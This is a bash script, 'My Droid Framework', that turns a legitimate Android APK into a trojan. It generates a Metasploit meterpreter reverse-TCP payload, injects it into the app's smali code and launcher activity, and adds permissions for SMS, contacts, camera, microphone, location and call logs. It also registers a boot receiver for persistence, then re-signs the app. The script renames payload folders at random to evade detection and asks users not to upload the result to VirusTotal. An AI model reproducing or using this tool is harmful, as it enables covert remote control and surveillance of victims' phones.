#!/bin/bash
clear
#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
subs="which file ? Enter number of choice or 'x' to exit"
# check internet 
function checkinternet() 
{
  sudo ping -c 1 google.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow " Checking For Internet: ${RedF}FAILED"
    echo
    echo -e $red "This Script Needs An Active Internet Connection"
    echo
    echo -e $yellow "Exitting"
    echo && sleep 2
    exit
  else
    echo -e $yellow " Checking For Internet: ${LighGreenF}CONNECTED"
  fi
}
checkinternet
sleep 2
# Check root
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
clear
#Define options
path=`pwd`
ver="v0.1"
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
echo ""
sleep 1
# spinner for Metasploit Generator
spinlong ()
{
    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    barlength=${#bar}
    i=0
    while ((i < 20)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
echo -e $red"[*] Stopping Services... "
postgresql_stop
sleep 1
echo ""
echo -e $yellow"[*] Bye Bye  :)"
exit
}
# check if metasploit-framework is installed
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
sleep 2
else
echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
echo -e $yellow "[ ! ] Please install Metasploit-Framework and rerun the script"; echo ; exit 1;
fi
echo -e $lightcyan "╔────────────────────────────────────────────────╗"
echo -e $lightcyan "|    	      My Droid Framework 	             |"
echo -e $lightcyan "|   Please do not upload APK to VirusTotal.com   |"
echo -e $lightcyan "┖────────────────────────────────────────────────┙"
sleep 15
clear
#function generate payload
function gen_payload()
{
 echo -e $yellow ""
 echo "[*] Generating apk payload"
 spinlong
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}
#function apktool
function apk_decomp()
{
 echo -e $yellow ""
 echo "[*] Decompiling Payload APK..."
 spinlong
 sh apktool d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
 rm $apk_name.apk
}
function apk_comp()
{
 echo -e $yellow ""
 echo "[*] Rebuilding APK file..."
 spinlong
 sh apktool b  $path/payload -o evil.apk > /dev/null 2>&1
 rm -r payload > /dev/null 2>&1
}
function apk_decomp1()
{
 echo -e $yellow ""
 echo "[*] Decompiling Original APK..."
 spinlong
 sh apktool d -f -o $path/original $orig > /dev/null 2>&1
}
function apk_comp1()
{
 echo -e $yellow ""
 echo "[*] Rebuilding Backdoored APK..."
 spinlong
 sh apktool b $path/original -o $path/evil.apk > /dev/null 2>&1
 rm -r payload > /dev/null 2>&1
 rm -r original > /dev/null 2>&1
}
#function errors
function error()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【X】 Failed to rebuild backdoored apk【X】"
   echo
   postgresql_stop
   exit $rc
 fi
}
function error0()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【X】 An Error Was Occured .Ty Again【X】"
   echo
   postgresql_stop
   exit $rc
 fi
}
#function postgresql service
function postgresql_start()
{
 #service postgresql start > /dev/null 2>&1
}
function postgresql_stop()
{
 #service postgresql stop > /dev/null 2>&1
}
# function adding permission
function perms()
{
 echo -e $yellow ""
 echo "[*] Adding permission and Hook Smali"
 spinlong
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 android_nam=$tmp
}
# functions hook smali
function hook_smalies()
{
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  echo
  echo "##################################################################"
  echo "inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "In line:$hook_num"
  echo "##################################################################"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  echo
  echo "##################################################################"
  echo "inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "In line:$hook_num"
  echo "##################################################################"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    spinlong
    echo -e $red ""
    echo "[x] cant find : $android_activity.smali"
    echo "[*] try another ..."
    spinlong
    sleep 2
    echo
    echo "##################################################################"
    echo "inject Smali: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    echo "In line:$hook_num"
    echo "##################################################################"
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi
 fi
}
#function signing apk
function sign()
{
 echo -e $yellow ""
 echo "[*] Checking for ~/.android/debug.keystore for signing..."
 spinlong
 if [ ! -f ~/.android/debug.keystore ]; then
     echo -e $red ""
     echo " [ X ] Debug key not found. Generating one now..."
     spinlong
     if [ ! -d "~/.android" ]; then
       mkdir ~/.android > /dev/null 2>&1
     fi
     echo -e $lightgreen ""
     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
 fi
 spinlong
 echo -e $yellow ""
 echo "[*] Attempting to sign the package with your android debug key"
 spinlong
 jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA evil.apk androiddebugkey > /dev/null 2>&1
 echo -e $yellow 
 echo "[*] Verifying signed artifacts..."
 spinlong
 jarsigner -verify -certs evil.apk > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "[!] Failed to verify signed artifacts"
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
 echo -e $yellow
 echo "[*] Aligning recompiled APK..."
 spinlong
 zipalign 4 evil.apk $apk_name.apk 2>&1
 rc=$?
 echo -e $yellow
 echo "[✔] Done."
 spinlong
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "[!] Failed to align recompiled APK"
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
 rm evil.apk > /dev/null 2>&1
}
#main menu
function main()
{
    while :
    do
        echo -e $green ""
        echo "╔──────────────────────────────────────────────╗"
        echo "|          My-Droid Framework $ver             |"
        echo "|      	 Hack android plateform              |"
        echo "┖──────────────────────────────────────────────┙"
		echo "[1] Backdoor with original apk"
		echo "[q] QUIT"
		read -p "[?] Select>: " option
        	echo
		case "$option" in 
            1)  echo -e $lightgreen "[✔] Backdoor with original apk"
			    echo -e $green
				echo -n "Enter payload name "
				read apk_name
				echo -n "Enter LHOST :"
				read LHOST
				echo -n "Enter LPORT :"
				read LPORT
				echo "Please keep original apk to be binded in bind folder"
				cd $path/bind
				ls | cat -n
				echo
				echo -e $blue "$subs"
				read choice
				orig=`ls | sed -n $choice'p'`
				echo
                		spinlong
                		gen_payload
                		apk_decomp1
                		apk_decomp
                		perms
                		hook_smalies
                		spinlong
                		apk_comp1
                		sign
                		echo 
				mv $apk_name.apk $path/Final > /dev/null 2>&1
                		error
                		sleep 2
                		echo ""
                		echo "BACKDOORED APK : $path/Final/$apk_name.apk " > /dev/null 2>&1
                		echo 
                		;;
		esac
	done
}
main
				
        